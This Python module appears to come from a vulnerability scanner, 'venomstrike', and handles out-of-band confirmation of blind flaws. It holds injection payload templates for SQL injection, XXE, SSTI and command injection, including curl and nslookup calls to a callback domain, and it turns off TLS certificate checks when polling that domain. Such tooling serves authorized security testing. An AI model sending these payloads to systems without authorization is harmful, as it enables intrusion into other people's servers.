"""Out-of-Band (OOB) verification for blind vulnerability confirmation.

Titan Edition (v7.0) adds OOB verification to confirm blind vulnerabilities
that cannot be detected through in-band response analysis alone.  OOB
verification works by embedding a unique callback token into payloads and
checking whether the target application triggers an outbound request to a
controlled endpoint.

Supported OOB channels:
- DNS callback: payload triggers a DNS lookup for token.callback-domain
- HTTP callback: payload triggers an HTTP request to callback-domain/token

For authorized security testing only.
"""
import hashlib
import logging
import time
import uuid
from typing import Dict, List, Optional

from config import OOB_CALLBACK_DOMAIN, OOB_CALLBACK_TIMEOUT

logger = logging.getLogger("venomstrike.oob_verifier")


class OOBToken:
    """Represents a unique OOB callback token tied to a specific test."""

    __slots__ = ("token", "vuln_type", "url", "param", "payload", "created_at")

    def __init__(self, vuln_type: str, url: str, param: str, payload: str):
        self.token = uuid.uuid4().hex[:16]
        self.vuln_type = vuln_type
        self.url = url
        self.param = param
        self.payload = payload
        self.created_at = time.time()

    @property
    def dns_hostname(self) -> str:
        """Return the DNS callback hostname for this token."""
        domain = OOB_CALLBACK_DOMAIN
        if not domain:
            return ""
        return f"{self.token}.{domain}"

    @property
    def http_url(self) -> str:
        """Return the HTTP callback URL for this token."""
        domain = OOB_CALLBACK_DOMAIN
        if not domain:
            return ""
        scheme = "https" if not domain.startswith("http") else ""
        base = f"{scheme}://{domain}" if scheme else domain
        return f"{base}/{self.token}"

    def to_dict(self) -> Dict:
        return {
            "token": self.token,
            "vuln_type": self.vuln_type,
            "url": self.url,
            "param": self.param,
            "dns_hostname": self.dns_hostname,
            "http_url": self.http_url,
            "created_at": self.created_at,
        }


class OOBVerifier:
    """Out-of-Band verification manager.

    Generates unique callback tokens, embeds them into payloads, and
    checks whether the target triggered the callback.  When no real
    callback infrastructure is configured (OOB_CALLBACK_DOMAIN is empty),
    the verifier operates in **dry-run** mode: it still generates tokens
    and builds payloads but always returns ``not_verified`` status.

    Usage::

        verifier = OOBVerifier()
        token = verifier.generate_token("sqli", url, param, payload)
        dns_payload = verifier.build_dns_payload(token, payload)
        http_payload = verifier.build_http_payload(token, payload)
        # ... send payloads ...
        result = verifier.check_callback(token)
    """

    # Payload templates for different vulnerability types
    DNS_PAYLOAD_TEMPLATES: Dict[str, str] = {
        "sqli": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT '{hostname}'), '\\\\a')); --",
        "xxe": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{hostname}">]><foo>&xxe;</foo>',
        "ssrf": "http://{hostname}/",
        "cmd": "nslookup {hostname}",
        "ssti": "${{{{__import__('os').system('nslookup {hostname}')}}}}",
        "rce": "; nslookup {hostname} ;",
        "lfi": "",  # LFI typically cannot trigger DNS
        "xss": "",  # XSS is client-side, no server OOB
    }

    HTTP_PAYLOAD_TEMPLATES: Dict[str, str] = {
        "sqli": "'; SELECT LOAD_FILE('{http_url}'); --",
        "xxe": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}">]><foo>&xxe;</foo>',
        "ssrf": "{http_url}",
        "cmd": "curl {http_url}",
        "ssti": "${{{{__import__('urllib.request').urlopen('{http_url}')}}}}",
        "rce": "; curl {http_url} ;",
        "lfi": "",
        "xss": "",
    }

    def __init__(self):
        self._pending_tokens: Dict[str, OOBToken] = {}
        self._verified_tokens: Dict[str, Dict] = {}
        self._callback_domain = OOB_CALLBACK_DOMAIN
        self._timeout = OOB_CALLBACK_TIMEOUT

    @property
    def is_configured(self) -> bool:
        """Return True if OOB callback infrastructure is configured."""
        return bool(self._callback_domain)

    def generate_token(
        self, vuln_type: str, url: str, param: str, payload: str,
    ) -> OOBToken:
        """Generate a unique OOB callback token for a test.

        The token is stored internally and can be checked later with
        ``check_callback()``.
        """
        token = OOBToken(vuln_type, url, param, payload)
        self._pending_tokens[token.token] = token
        return token

    def build_dns_payload(self, token: OOBToken, original_payload: str) -> str:
        """Build an OOB DNS callback payload.

        If no DNS hostname is available (domain not configured or vuln
        type unsupported), returns the original payload unchanged.
        """
        hostname = token.dns_hostname
        if not hostname:
            return original_payload

        # Look up the template for this vuln type
        template = self.DNS_PAYLOAD_TEMPLATES.get(token.vuln_type, "")
        if not template:
            return original_payload

        return template.format(hostname=hostname)

    def build_http_payload(self, token: OOBToken, original_payload: str) -> str:
        """Build an OOB HTTP callback payload.

        If no HTTP URL is available (domain not configured or vuln
        type unsupported), returns the original payload unchanged.
        """
        http_url = token.http_url
        if not http_url:
            return original_payload

        template = self.HTTP_PAYLOAD_TEMPLATES.get(token.vuln_type, "")
        if not template:
            return original_payload

        return template.format(http_url=http_url)

    def check_callback(self, token: OOBToken) -> Dict:
        """Check whether an OOB callback was received for a token.

        In dry-run mode (no callback domain configured), returns
        ``not_configured`` status.  With real infrastructure, queries
        the callback server for the token.

        Returns:
            Dict with ``verified`` (bool), ``status`` (str), ``token`` (str),
            and optional ``callback_data``.
        """
        result = {
            "verified": False,
            "status": "not_configured",
            "token": token.token,
            "vuln_type": token.vuln_type,
            "url": token.url,
            "param": token.param,
            "check_time": time.time(),
        }

        if not self.is_configured:
            result["status"] = "not_configured"
            return result

        # Query the callback server for this token
        try:
            import requests
            check_url = f"https://{self._callback_domain}/api/check/{token.token}"
            resp = requests.get(check_url, timeout=self._timeout, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("found"):
                    result["verified"] = True
                    result["status"] = "callback_received"
                    result["callback_data"] = data
                    self._verified_tokens[token.token] = result
                    logger.info(
                        "OOB callback confirmed for %s @ %s param=%s",
                        token.vuln_type, token.url, token.param,
                    )
                else:
                    result["status"] = "no_callback"
            else:
                result["status"] = "check_failed"
        except Exception as e:
            logger.debug("OOB check error for %s: %s", token.token, e)
            result["status"] = "check_error"

        return result

    def get_pending_tokens(self) -> List[OOBToken]:
        """Return all pending (unchecked) tokens."""
        return list(self._pending_tokens.values())

    def get_verified_tokens(self) -> Dict[str, Dict]:
        """Return all verified callback results."""
        return dict(self._verified_tokens)

    def build_verification_evidence(self, token: OOBToken, check_result: Dict) -> Dict:
        """Build evidence data from an OOB verification result.

        This creates structured proof data suitable for inclusion in an
        ``EvidencePackage``.
        """
        return {
            "oob_verification": True,
            "oob_token": token.token,
            "oob_channel": "dns" if token.dns_hostname else "http",
            "oob_status": check_result.get("status", "unknown"),
            "oob_verified": check_result.get("verified", False),
            "oob_callback_domain": self._callback_domain,
            "oob_check_time": check_result.get("check_time"),
        }

    def cleanup_expired(self, max_age: float = 300.0) -> int:
        """Remove tokens older than ``max_age`` seconds.

        Returns the number of tokens removed.
        """
        now = time.time()
        expired = [
            tid for tid, tok in self._pending_tokens.items()
            if now - tok.created_at > max_age
        ]
        for tid in expired:
            del self._pending_tokens[tid]
        return len(expired)
